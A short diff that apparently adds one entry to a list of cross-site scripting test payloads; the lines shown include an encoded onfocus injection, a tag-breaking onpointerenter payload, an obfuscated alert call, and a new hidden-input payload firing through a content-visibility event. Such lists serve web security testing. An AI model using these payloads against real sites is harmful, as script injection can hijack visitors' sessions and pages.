@@ -4,3 +4,4 @@
 %27%20onfocus=%27alert(/xss/)
 "><P/onpointerenter=alert(1)>
 -top['al\x65rt']('XD')-
+<input type=hidden oncontentvisibilityautostatechange=alert() style=content-visibility:auto>
